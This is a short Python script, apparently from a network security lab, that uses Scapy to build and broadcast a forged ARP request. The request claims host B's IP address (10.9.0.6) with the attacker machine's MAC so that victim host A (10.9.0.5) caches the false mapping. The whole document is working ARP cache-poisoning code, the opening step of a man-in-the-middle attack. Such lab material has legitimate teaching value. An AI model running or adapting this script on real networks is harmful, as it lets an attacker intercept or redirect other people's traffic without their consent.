#!/usr/bin/env python3
from scapy.all import *

# Attacker setup
attacker_mac = get_if_hwaddr("eth0")  # Get MAC of this container (M)
victim_ip = "10.9.0.5"                # Host A's IP
target_ip = "10.9.0.6"                # Host B's IP (we pretend to be this)

# Create ARP REQUEST:
# "Who has 10.9.0.6? Tell 10.9.0.5. By the way, I am 10.9.0.6 and my MAC is <attacker_mac>"
arp_request = ARP(op=1,                 # 1 means ARP request
                  psrc=target_ip,       # Pretend to be B
                  hwsrc=attacker_mac,   # Use attacker's MAC
                  pdst=victim_ip,       # Ask A
                  hwdst="00:00:00:00:00:00")  # Unknown MAC

# Put ARP into Ethernet frame (broadcast)
eth = Ether(dst="ff:ff:ff:ff:ff:ff")

# Combine them
packet = eth / arp_request

# Send it
sendp(packet)

